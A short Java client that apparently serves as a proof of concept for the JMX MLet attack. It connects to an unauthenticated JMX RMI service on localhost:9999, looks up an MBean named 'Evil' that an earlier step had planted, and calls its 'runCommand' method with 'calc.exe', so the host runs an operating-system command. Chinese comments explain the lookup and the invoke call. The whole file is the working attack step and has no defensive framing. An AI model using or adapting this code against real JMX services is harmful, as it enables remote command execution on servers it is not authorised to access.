package JMX_Remote;

import java.io.IOException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;


public class Client
{
    public static void main(String[] args) throws IOException, Exception, NullPointerException
    {
        JMXServiceURL url = new JMXServiceURL
                ("service:jmx:rmi:///jndi/rmi://localhost:9999/jmxrmi");
        JMXConnector jmxc = JMXConnectorFactory.connect(url,null);

        MBeanServerConnection mbsc = jmxc.getMBeanServerConnection();
        //ObjectName的名称与前面注册时候的保持一致
        ObjectName mbeanName = new ObjectName("MLetCompromise1:name=Evil,id=10");

        System.out.println("MBean count = " + mbsc.getMBeanCount());
        //invoke调用bean的方法，只针对非设置属性的方法,例如invoke不能对getName方法进行调用
        mbsc.invoke(mbeanName, "runCommand", new Object[]{ "calc.exe" }, new String[]{ String.class.getName() });
    }
}